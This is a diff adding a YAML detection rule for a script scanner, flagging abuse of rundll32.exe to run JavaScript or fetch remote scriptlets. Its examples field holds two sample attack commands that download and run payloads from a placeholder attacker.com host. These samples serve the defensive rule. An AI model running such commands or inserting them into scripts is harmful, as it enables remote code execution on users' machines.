@@ -1,0 +1,32 @@
+# PowerShell Pattern: Rundll32 LOLBin Abuse
+# Detects rundll32.exe usage for code execution
+
+id: PS-024
+name: Rundll32 LOLBin Abuse
+description: |
+  Detects abuse of rundll32.exe as a Living Off The Land Binary for executing
+  malicious code, JavaScript, or loading remote payloads. Rundll32 can execute
+  JavaScript via mshtml.dll and download/execute scriptlets from remote servers.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)rundll32(?:\.exe)?.*(?:javascript:|url\.dll|mshtml|RunHTMLApplication|http://|https://|\.sct)'
+severity: High
+mitre_technique: T1218.011
+confidence: 0.90
+category: defense_evasion
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-19"
+  references:
+    - "https://attack.mitre.org/techniques/T1218/011/"
+    - "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+  tags:
+    - lolbin
+    - rundll32
+    - code-execution
+    - defense-evasion
+  examples:
+    - "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker.com/payload.sct\")"
+    - "rundll32.exe url.dll,OpenURL http://attacker.com/malware.hta"
